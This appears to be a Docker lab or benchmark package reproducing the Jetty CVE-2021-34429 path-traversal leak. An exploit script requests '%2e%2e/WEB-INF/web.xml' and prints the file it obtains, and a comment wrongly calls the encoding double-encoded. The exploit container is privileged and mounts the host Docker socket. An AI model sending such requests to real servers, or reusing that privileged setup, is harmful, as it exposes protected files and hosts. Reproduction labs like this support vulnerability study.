{
    "files": [
        {
            "location": "./../../dockers/CVE-2021-34429/custom_no_tool/docker-compose.yml",
            "content": "services:\n  vulnerable:\n    image: alpine:3.13\n    container_name: vulnerable\n    command: [\"tail\", \"-f\", \"/dev/null\"]\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n\n  jetty-vuln:\n    image: jetty:9.4.42-jdk11\n    container_name: jetty-vuln\n    ports:\n      - \"8080:8080\"\n    volumes:\n      - ./webapp:/var/lib/jetty/webapps/ROOT:ro\n    # Ensure Jetty runs in the foreground (default entrypoint does this)\n\n  exploit:\n    build:\n      context: .\n      dockerfile: Dockerfile.exploit\n    container_name: exploit\n    depends_on:\n      - vulnerable\n      - jetty-vuln\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n    privileged: true\n    command: [\"sh\", \"/exploit.sh\"]"
        },
        {
            "location": "./../../dockers/CVE-2021-34429/custom_no_tool/Dockerfile.exploit",
            "content": "FROM alpine:3.13\nRUN apk add --no-cache curl\nCOPY exploit.sh /exploit.sh\nRUN chmod +x /exploit.sh"
        },
        {
            "location": "./../../dockers/CVE-2021-34429/custom_no_tool/exploit.sh",
            "content": "#!/bin/sh\n\necho \"Starting exploit against vulnerable Jetty instance...\"\n\n# Wait until Jetty is listening on port 8080\nMAX_WAIT=60\nWAITED=0\nwhile true; do\n  if curl -s -o /dev/null http://jetty-vuln:8080/; then\n    echo \"Jetty is up after $WAITED seconds.\"\n    break\n  fi\n  sleep 2\n  WAITED=$((WAITED + 2))\n  if [ $WAITED -ge $MAX_WAIT ]; then\n    echo \"Jetty did not become ready within $MAX_WAIT seconds. Exiting.\"\n    exit 1\n  fi\ndone\n\n# Crafted request that uses a double\u2011encoded \"..\" to bypass Jetty's canonicalisation\nTARGET_URL=\"http://jetty-vuln:8080/%2e%2e/WEB-INF/web.xml\"\n\necho \"Sending request to $TARGET_URL\"\n\n# Perform the request and display HTTP status and response body (if any)\nresponse=$(curl -s -w \"%{http_code}\" \"$TARGET_URL\")\nstatus=${response: -3}\nbody=${response%???}\n\necho \"HTTP status: $status\"\nif [ \"$status\" = \"200\" ]; then\n  echo \"--- Begin leaked file content ---\"\n  echo \"$body\"\n  echo \"--- End leaked file content ---\"\nelse\n  echo \"Exploit did not succeed (non\u2011200 response).\"\nfi\n\n# Keep the container alive for a short period so logs can be inspected\nsleep 30"
        },
        {
            "location": "./../../dockers/CVE-2021-34429/custom_no_tool/webapp/WEB-INF/web.xml",
            "content": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee\n                             http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd\"\n         version=\"3.1\">\n    <display-name>Test WebApp</display-name>\n    <description>Simple web.xml for CVE\u20112021\u201134429 demonstration</description>\n</web-app>"
        }
    ],
    "directory_tree": "CVE-2021-34429/custom_no_tool"
}